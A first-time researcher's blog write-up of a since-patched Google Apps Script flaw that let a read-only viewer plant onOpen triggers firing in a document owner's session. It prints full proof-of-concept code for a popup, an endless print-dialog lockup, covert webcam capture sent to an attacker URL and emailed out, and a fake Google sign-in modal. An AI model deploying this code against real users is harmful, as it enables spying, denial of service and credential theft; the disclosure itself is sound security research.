+++
date = '2026-05-14T11:49:38+05:30'
draft = false
title = 'The Silent Trigger: How Viewer Access Leads to UI Abuse in Google Workspace'
+++

Hi team, this is my first write up. It will be a little long, but I have tried my best to keep it simple. I just want to make sure that anyone reading this can follow along and understand it well in a simple way.

So before I get into the bug I found, I want to briefly explain what Apps Script is.

Think of Google Apps Script as a superpower for your favorite Google apps like Docs, Sheets, Gmail, and Drive. It is a lightweight beginner friendly coding platform that lets you write simple scripts to automate tasks, connect your apps together and build custom features. If you already know how to use Google Docs or Sheets. Apps Script is like an invisible assistant that can do your work for you in the background. The main goal of Apps Script is automation, making things happen automatically so you don't have to do them manually.

Here are three simple examples so you can understand it more easily. We can do a lot more with Apps Script but I am just showing the basics here.

## Example 1: Auto inserting text into a Google Doc

Step 1: Open the Script Editor

Inside any open Google Doc and click on Extensions in the top menu bar then select Apps Script. This opens a new web page where you write your automation instructions.

Step 2: Write a simple script

By default, you will see a blank area with a function skeleton. To make a simple automation that adds text to your document, type the following code.

```javascript
function insertWelcomingText() {
  // 1. Open the current active document
  var doc = DocumentApp.getActiveDocument();

  // 2. Access the main body of the text
  var body = doc.getBody();

  // 3. Automatically append a new paragraph
  body.appendParagraph("Hello readers! This text was generated automatically using Google Apps Script.");
}
```
Step 4: Grant permissions

 Apps Script is powerful, Google will show a pop up asking for your permission to let the script modify your document. You only need to grant this authorization once.

Step 5: See the content

Go back to your Google Doc tab. You will see that the sentence "Hello readers! This text was generated automatically using Google Apps Script." has instantly appeared at the bottom of the page without you typing it.

<video width="100%" controls>
  <source src="/videos/Example_1.mp4" type="video/mp4">
</video>

So here:  It runs entirely in the cloud. You just need a web browser no software or compilers required. It uses JavaScript.If you find yourself doing the same copy paste routine every day, a 5 line script can often replace hours of manual work.

### Example 2: Automated Document Customization

Imagine a manager (the Owner) shares a Google Doc ID with an assistant (the Editor). The document is a massive, messy template filled with placeholder text like [CLIENT_NAME], [DATE], and [PRICE].

Normally, a human would have to spend 15 minutes carefully reading through the whole document, finding every placeholder, and typing over them. It is tedious, boring, and easy to make a mistake.

With Apps Script, the Editor can do this in 2 seconds using a simple "Find and Replace" automation.

Step 1: The Shared Document
The owner gives the editor a Document ID. Inside that document, there is text that looks like this.

"Dear [NAME], we are pleased to confirm your appointment on [DATE]. Please review your details."

Step 2: The Editor's Automation Code

The Editor opens the Apps Script editor and pastes this simple code. It instructs the script to find the shared ID, search for the brackets, and replace them with the actual information instantly.

```javascript
function customizeSharedDocument() {
  // 1. The ID of the shared document given by the owner
  var sharedDocId = "1A2b3C4d5E6f7G8h9I0j"; 
  var doc = DocumentApp.openById(sharedDocId);
  var body = doc.getBody();
  
  // 2. The data that needs to go into the document
  var clientName = "Alex Rivera";
  var appointmentDate = "June 20, 2026";
  
  // 3. The Magic: Automatically find and replace the placeholders
  body.replaceText("\\[NAME\\]", clientName);
  body.replaceText("\\[DATE\\]", appointmentDate);
}
```
Step 3: Run and Done
When the Editor clicks Run, the script sweeps through the entire document instantly.

Every single place where [NAME] or [DATE] appeared is perfectly swapped out with "Alex Rivera" and "June 20, 2026".

so here: A tired employee might miss a placeholder on page 4 of a long document. The script never misses. If the manager suddenly says, "Here are the IDs for 100 different client letters, please update all of them", a human would take days to finish. The Editor could easily modify this script to pull a list of 100 names and dates from a Google Sheet, loop through the document IDs, and customize all 100 files in under a minute.

## Moving to the Vulnerability

Now that we understand how Apps Script handles automation and opens files using unique Document IDs let's look at the underlying security flaw I discovered.

While building automations in Google Docs, I discovered a hidden flaw in Apps Script that gives read only viewers unexpected power....

A core feature of this platform is the use of "triggers." Think of triggers as automated tripwires, they are rules that tell a script to run automatically in the background whenever a specific event occurs. Users love to automate their workspaces to eliminate repetitive tasks. For example, you might use a trigger to:

Automatically send an email alert the moment a specific document is modified.

Generate and distribute a weekly PDF report every Friday at 5 PM.

Instantly format or validate new data as it is entered. 
## The Core Problem

Google's official documentation states clearly:

> *"They don't run if a file is opened in read only (view or comment) mode. For standalone scripts, users need at least view access to the script file for triggers to run properly."*

However, during my research, I observed a critical deviation from this rule. While it is true that the trigger won't run when the *Viewer* opens the file, the system fails to prevent the Viewer from *creating* the trigger in the first place. By binding an `onOpen` trigger to a specific Document ID, the read only user can plant a trap. Because the trigger is tied to the document itself, it fires inside the **owner's or editor's** session the next time they open or refresh the file.

The result: a low privileged user forcing arbitrary code to execute in a high privileged user's browser, entirely within the trusted `docs.google.com` domain.

---

## How the Attack Works (Setup)

The attacker operating with only Viewer access needs nothing more than the document's ID. From a separate Apps Script project, they run this script once.

```javascript
function myFunction() {
  // Clean up any old triggers
  ScriptApp.getProjectTriggers().forEach(trigger =>
    ScriptApp.deleteTrigger(trigger)
  );

  // Bind a trigger to the target document using only its ID
  ScriptApp.newTrigger('formTriggerRan')
    .forDocument('DOCUMENT_ID_HERE')
    .onOpen()
    .create();
}
```

From this point on, every time the document owner or editor refreshes the file, `formTriggerRan()` executes silently in their session.

<video width="100%" controls>
  <source src="/videos/Example_2.mp4" type="video/mp4">
</video>

---

## Scenario 1 — Basic Proof of Concept

The simplest payload. A modal alert that pops up in the owner's browser.

Steps to Reproduce

1. The Document Owner creates a new Google Document and shares it with the attacker, granting them only Viewer access.

2. The attacker opens the document and copies the Document ID from the URL (the long alphanumeric string between /d/ and /edit).

3. The attacker opens a separate, standalone Google Apps Script project and pastes the exploit code below, inserting the victim's Document ID.

4. The attacker manually runs myFunction(). Despite only having Viewer access to the target document, the Apps Script engine successfully creates the onOpen trigger without any error.

5. The next time the Owner opens or refreshes the document, the trigger fires silently in their session, and the HTML modal appears natively inside Google Docs.

```javascript

 * STEP 1: Trigger setup — run this ONCE manually as the Viewer (attacker)
 */
function myFunction() {
  // Remove any existing triggers (keeps the environment clean)
  ScriptApp.getProjectTriggers().forEach(trigger =>
    ScriptApp.deleteTrigger(trigger)
  );

  // Bind an onOpen trigger to the victim's document using only its ID
  ScriptApp.newTrigger('formTriggerRan')
    .forDocument('1RGW8gHSimkiFUcw_aerFG5_2rzGVBgdmAGrIxGDOCA0') // ← victim's Document ID
    .onOpen()
    .create();
}

/**
 * STEP 2: The payload — runs automatically when the Owner opens the document
 */
function formTriggerRan(e) {
  const html = HtmlService
    .createHtmlOutput('<script>alert("Executed as Owner");google.script.host.close();</script>')
    .setWidth(200)
    .setHeight(100);

  // Renders natively inside the Google Docs UI — no external links, no redirects
  DocumentApp.getUi().showModalDialog(html, 'Security Alert');
}
```

<video src="/videos/SE1.mp4" width="100%" autoplay loop muted playsinline></video>

What the owner sees: An unexpected alert popup appearing directly inside their own document.


## Scenario 2 — UI Denial of Service (Infinite Print Loop)

A slightly nastier payload locks up the document entirely. The attacker creates a hidden 1×1 pixel window that forces the browser's print dialog to open  and reopens it every second, even if the owner clicks "Cancel."

```javascript
function formTriggerRan(e) {
  const html = HtmlService.createHtmlOutput(`
    <script>
      function spamPrint() {
        window.print();
        setTimeout(spamPrint, 1000);
      }
      spamPrint();
    </script>
  `).setWidth(1).setHeight(1);

  DocumentApp.getUi().showModalDialog(html, 'Print Preview');
}
```

<video width="100%" controls>
  <source src="/videos/SE2.mp4" type="video/mp4">
</video>

**Impact:** The owner is stuck in an inescapable print loop. The document becomes completely unusable until they know to force close the tab.

---

## Scenario 3 — Covert Camera Exfiltration

This is where it escalates into a serious privacy breach.

How It Works

The attacker (with only viewer access) sets up a two part system using Google Apps Script:

1. A receiver web app — deployed by the attacker to collect captured images via email.
2. A camera trap — an HTML file delivered through the onOpen trigger as a modal titled    "Security Check."

 When the document owner refreshes the page, a popup appears natively within Google Docs requesting camera permissions. If the owner clicks Allow or has previously granted camera permissions to Google Docs, in which case no prompt appears at all, the exploit proceeds silently. The front camera is activated, and photos are captured every 15 seconds and sent to the attacker's email.

 Steps to Reproduce
1. Setup
The attacker obtains the document ID from their viewer access, then opens Apps Script and creates three files.

2. The Receiver (Attacker's Web App)
This receives the captured images and forwards them as email attachments.

```javascript
function doPost(e) {
  try {
    let imageBlob = null;
    let user = e.parameter.user || 'unknown';
    let time = e.parameter.time || new Date().toISOString();

    if (e.parameter.image) {
      const base64Data = e.parameter.image.replace(/^data:image\/[a-z]+;base64,/, '');
      imageBlob = Utilities.newBlob(
        Utilities.base64Decode(base64Data), 'image/jpeg', 'capture.jpg'
      );
    }

    const subject = `Webcam Capture: ${user}`;
    const body = `User: ${user}\nTime: ${time}`;
    const options = {};

    if (imageBlob) {
      options.attachments = [imageBlob.setName(`${user}_${Date.now()}.jpg`)];
    }

    GmailApp.sendEmail('attacker@email.com', subject, body, options);

    return ContentService
      .createTextOutput(JSON.stringify({ status: 'OK' }))
      .setMimeType(ContentService.MimeType.JSON);

  } catch (error) {
    return ContentService
      .createTextOutput(JSON.stringify({ error: error.toString() }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}
```

This is deployed as a Web App: Execute as: Me | Access: Anyone. The resulting URL is used in the next two files.

3. The Trigger
This sets an onOpen trigger on the victim's document. When the owner opens or refreshes the document, it launches the camera trap as a modal dialog.
```javascript
javascriptfunction formTriggerRan(e) {
  const html = HtmlService.createHtmlOutputFromFile('camera')
    .setWidth(450).setHeight(400);
  DocumentApp.getUi().showModalDialog(html, 'Security Check');
}

function myFunction() {
  ScriptApp.getProjectTriggers().forEach(trigger => ScriptApp.deleteTrigger(trigger));
  ScriptApp.newTrigger('formTriggerRan')
    .forDocument('DOCUMENT_ID_HERE')
    .onOpen()
    .create();
}
```

4. The Camera Trap
Runs in the owner's browser inside the modal. Requests camera access, then silently exfiltrates a photo every 15 seconds.

```javascript
javascriptconst stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
video.srcObject = stream;

setInterval(() => {
  ctx.drawImage(video, 0, 0, 320, 240);
  const screenshot = canvas.toDataURL('image/jpeg', 0.7);
  fetch(ATTACKER_URL, {
    method: 'POST',
    body: new URLSearchParams({ image: screenshot, time: new Date().toISOString() })
  });
}, 15000);
```

**Why this is especially dangerous:** The permission prompt appears inside a document the owner already trusts, on Google's own domain.There are no suspicious links, no spoofed websites, nothing that would normally raise a red flag.If the owner has previously granted camera permissions to Google Docs, no prompt appears at all.

Unfortunately, I did not record a video Proof of Concept for this specific camera exfiltration. However, I do have the actual captured image that the script successfully exfiltrated to my attacker controlled email address.

<img src="/images/Im1.png" width="70%" alt="Proof of Concept Screenshot">
<img src="/images/Im2.png" width="70%" alt="Proof of Concept Screenshot">


*A few days after this was reported to Google, the image exfiltration stopped working, Google had patched it on their end*

---

## Scenario 4 — Zero-Click Credential Phishing

Standard phishing requires a victim to click a suspicious link and ignore a wrong URL. This attack requires neither.

The trigger renders a **fake Google Sign In modal** directly inside the real document, on the real `docs.google.com` domain. Now, you might be thinking, *I would spot a fake login screen immediately.* And it is true that a highly vigilant user might notice something feels slightly "off" about the prompt. I am not saying every single person will fall for this trap every time. But if the attacker puts effort into making the UI look convincing, a regular user with no technical background can easily be fooled.

**Trigger setup:**

```javascript
function myFunction() {
  ScriptApp.getProjectTriggers().forEach(trigger => ScriptApp.deleteTrigger(trigger));

  ScriptApp.newTrigger('showPhishingModal')
    .forDocument('DOCUMENT_ID_HERE')
    .onOpen()
    .create();
}

function showPhishingModal(e) {
  var html = HtmlService.createHtmlOutputFromFile('login-spoof')
    .setWidth(450)
    .setHeight(650);

  DocumentApp.getUi().showModalDialog(html, 'Sign in to Google Docs');
}
```
<video width="100%" controls>
  <source src="/videos/SE4.mp4" type="video/mp4">
</video>


---

---

### Final Thoughts & Status

Before I sign off, I want to mention that I am very much still a beginner in the web security field. I'm taking things one step at a time.Google acknowledged the issue and resolved it with a patch from their end.I hope you found the write up interesting!. Thank you